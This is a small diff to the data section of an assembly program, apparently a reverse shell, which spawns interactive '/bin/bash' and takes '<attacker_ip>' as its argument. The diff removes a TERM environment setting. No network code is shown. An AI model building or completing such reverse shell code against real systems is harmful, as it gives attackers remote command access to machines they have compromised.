@@ -3,8 +3,6 @@ section .data
     command      db '/bin/bash',0
     bash_i       db '-i',0
     bash_args    dq command, bash_i, 0
-    term_env     db 'TERM=xterm',0
-    env_vars     dq term_env, 0
     
     ; Messages d'erreur
     err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
